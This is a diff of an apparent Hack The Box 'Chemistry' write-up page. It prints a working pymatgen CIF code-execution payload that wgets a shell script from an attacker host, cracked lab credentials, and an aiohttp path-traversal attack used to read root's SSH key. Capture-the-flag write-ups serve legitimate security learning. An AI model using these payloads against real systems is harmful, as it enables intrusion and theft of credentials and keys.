@@ -1,1 +1,149 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as app</u></strong></span></p><p>We can upload CIF files here</p><p><a href="http://10.10.11.38:5000/dashboard">http://10.10.11.38:5000/dashboard</a></p><p>&nbsp;</p><p>Following this link we can have rce</p><p>https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</p><p>&nbsp;</p><p>&nbsp;</p><p>example payload</p><p><code>data_5yOhtAoR</code><br><code>_audit_creation_date &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2018-06-08</code><br><code>_audit_creation_method &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"Pymatgen CIF Parser Arbitrary Code Execution Exploit"</code></p><p><code>loop_</code><br><code>_parent_propagation_vector.id</code><br><code>_parent_propagation_vector.kxkykz</code><br><code>k1 [0 0 0]</code></p><p><code>_space_group_magn.transform_BNS_Pp_abc &nbsp;'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://10.10.14.4/shell.sh");0,0,0'</code></p><p><br><code>_space_group_magn.number_BNS &nbsp;62.448</code><br><code>_space_group_magn.name_BNS &nbsp;"P &nbsp;n' &nbsp;m &nbsp;a' &nbsp;</code>"<br>&nbsp;</p><p>&nbsp;</p><p>I couldnt get any shells to work so i used wget, then in the second payload I used chmod +x shell.sh and third ./shell.sh</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:710/191;" src="../img/posts/2024-11-8-Chemistry(HTB)/01-ebc94336a7.png" width="710" height="191"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Rosa</u></strong></span></p><p>Password found /home/app/app.py</p><p>MyS3cretCh3mistry4PP</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:557/122;" src="../img/posts/2024-11-8-Chemistry(HTB)/02-d58412ce4d.png" width="557" height="122"></figure><p>&nbsp;</p><p>Password above seems to be nothing. Checking the database file we can see usernames and password hashes.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1263/452;" src="../img/posts/2024-11-8-Chemistry(HTB)/03-5459949e7b.png" width="1263" height="452"></figure><p>&nbsp;</p><p>Rosas hash 63ed86ee9f624c7b14f1d4f43dc251a5 cracks to unicorniosrosados</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1067/379;" src="../img/posts/2024-11-8-Chemistry(HTB)/04-212cbc8f46.png" width="1067" height="379"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>rosa:unicorniosrosados</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Root</u></strong></span></p><p>&nbsp;</p><p>Port 8080 is running a webserver on local host</p><p>&nbsp;</p><p>ssh -L 1234:localhost:8080 rosa@10.10.11.38</p><p>&nbsp;</p><p>&nbsp;</p><p>Site has nothing interesting at first glance</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:989/510;" src="../img/posts/2024-11-8-Chemistry(HTB)/05-b83f9cf5f4.png" width="989" height="510"></figure><p>&nbsp;</p><p>Looking at the response headers we have aiohttp/3.9.1 which has a path traversal exploit</p><p>https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:394/194;" src="../img/posts/2024-11-8-Chemistry(HTB)/06-a85912ee6a.png" width="394" height="194"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>The proof of concept shows the static directory, in our case all we have is the assets directory and the exploit works with it.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:901/358;" src="../img/posts/2024-11-8-Chemistry(HTB)/07-ac1236bf8c.png" width="901" height="358"></figure><p>&nbsp;</p><p>Testing exploit</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:748/630;" src="../img/posts/2024-11-8-Chemistry(HTB)/08-78b87a8c3e.png" width="748" height="630"></figure><p>&nbsp;</p><p>&nbsp;</p><p>grabbing root flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:757/101;" src="../img/posts/2024-11-8-Chemistry(HTB)/09-9f359f108e.png" width="757" height="101"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I was originally following a different POC which didnt have the -path-as-is flag which turns out is required</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:600/149;" src="../img/posts/2024-11-8-Chemistry(HTB)/10-fff65cdebc.png" width="600" height="149"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>If we want to get a full shell we can use the POC above to get the root id_rsa key</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:764/202;" src="../img/posts/2024-11-8-Chemistry(HTB)/11-09c6437550.png" width="764" height="202"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:967/604;" src="../img/posts/2024-11-8-Chemistry(HTB)/12-cd1faaa1e8.png" width="967" height="604"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:795/722;" src="../img/posts/2024-11-8-Chemistry(HTB)/13-7ae302c3d0.png" width="795" height="722"></figure><p>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Chemistry | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-11-8-Chemistry(HTB)/01-ebc94336a7.png" alt="HTB: Chemistry cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Chemistry</h1>
+                <div class="post-meta">March 16, 2025 &bull; HTB</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as app</h1>
+
+        <p>We can upload CIF files here</p>
+
+        <p><a href="http://10.10.11.38:5000/dashboard">http://10.10.11.38:5000/dashboard</a></p>
+
+        <p>Following this link we can have rce</p>
+
+        <p>https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</p>
+
+        <p>example payload</p>
+
+        <p><code>data_5yOhtAoR</code><br/><code>_audit_creation_date            2018-06-08</code><br/><code>_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"</code></p>
+
+        <p><code>loop_</code><br/><code>_parent_propagation_vector.id</code><br/><code>_parent_propagation_vector.kxkykz</code><br/><code>k1 [0 0 0]</code></p>
+
+        <pre class="terminal"><code>_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://10.10.14.4/shell.sh");0,0,0'</code></pre>
+
+        <p><br/><code>_space_group_magn.number_BNS  62.448</code><br/><code>_space_group_magn.name_BNS  "P  n'  m  a'  </code>"<br/> </p>
+
+        <p>I couldnt get any shells to work so i used wget, then in the second payload I used chmod +x shell.sh and third ./shell.sh</p>
+
+        <img alt="Screenshot 1" height="191" src="../img/posts/2024-11-8-Chemistry(HTB)/01-ebc94336a7.png" style="aspect-ratio:710/191;" width="710"/>
+
+        <h1 style="color:red;">Shell as Rosa</h1>
+
+        <p>Password found /home/app/app.py</p>
+
+        <p>MyS3cretCh3mistry4PP</p>
+
+        <img alt="Screenshot 2" height="122" src="../img/posts/2024-11-8-Chemistry(HTB)/02-d58412ce4d.png" style="aspect-ratio:557/122;" width="557"/>
+
+        <p>Password above seems to be nothing. Checking the database file we can see usernames and password hashes.</p>
+
+        <img alt="Screenshot 3" height="452" src="../img/posts/2024-11-8-Chemistry(HTB)/03-5459949e7b.png" style="aspect-ratio:1263/452;" width="1263"/>
+
+        <p>Rosas hash 63ed86ee9f624c7b14f1d4f43dc251a5 cracks to unicorniosrosados</p>
+
+        <img alt="Screenshot 4" height="379" src="../img/posts/2024-11-8-Chemistry(HTB)/04-212cbc8f46.png" style="aspect-ratio:1067/379;" width="1067"/>
+
+        <p>rosa:unicorniosrosados</p>
+
+        <h1 style="color:red;">Shell as Root</h1>
+
+        <p>Port 8080 is running a webserver on local host</p>
+
+        <p>ssh -L 1234:localhost:8080 rosa@10.10.11.38</p>
+
+        <p>Site has nothing interesting at first glance</p>
+
+        <img alt="Screenshot 5" height="510" src="../img/posts/2024-11-8-Chemistry(HTB)/05-b83f9cf5f4.png" style="aspect-ratio:989/510;" width="989"/>
+
+        <p>Looking at the response headers we have aiohttp/3.9.1 which has a path traversal exploit</p>
+
+        <p>https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0</p>
+
+        <img alt="Screenshot 6" height="194" src="../img/posts/2024-11-8-Chemistry(HTB)/06-a85912ee6a.png" style="aspect-ratio:394/194;" width="394"/>
+
+        <p>The proof of concept shows the static directory, in our case all we have is the assets directory and the exploit works with it.</p>
+
+        <img alt="Screenshot 7" height="358" src="../img/posts/2024-11-8-Chemistry(HTB)/07-ac1236bf8c.png" style="aspect-ratio:901/358;" width="901"/>
+
+        <p>Testing exploit</p>
+
+        <img alt="Screenshot 8" height="630" src="../img/posts/2024-11-8-Chemistry(HTB)/08-78b87a8c3e.png" style="aspect-ratio:748/630;" width="748"/>
+
+        <p>grabbing root flag</p>
+
+        <img alt="Screenshot 9" height="101" src="../img/posts/2024-11-8-Chemistry(HTB)/09-9f359f108e.png" style="aspect-ratio:757/101;" width="757"/>
+
+        <p>I was originally following a different POC which didnt have the -path-as-is flag which turns out is required</p>
+
+        <img alt="Screenshot 10" height="149" src="../img/posts/2024-11-8-Chemistry(HTB)/10-fff65cdebc.png" style="aspect-ratio:600/149;" width="600"/>
+
+        <p>If we want to get a full shell we can use the POC above to get the root id_rsa key</p>
+
+        <img alt="Screenshot 11" height="202" src="../img/posts/2024-11-8-Chemistry(HTB)/11-09c6437550.png" style="aspect-ratio:764/202;" width="764"/>
+
+        <img alt="Screenshot 12" height="604" src="../img/posts/2024-11-8-Chemistry(HTB)/12-cd1faaa1e8.png" style="aspect-ratio:967/604;" width="967"/>
+
+        <img alt="Screenshot 13" height="722" src="../img/posts/2024-11-8-Chemistry(HTB)/13-7ae302c3d0.png" style="aspect-ratio:795/722;" width="795"/>
+    </article>
+
+</body>
+</html>
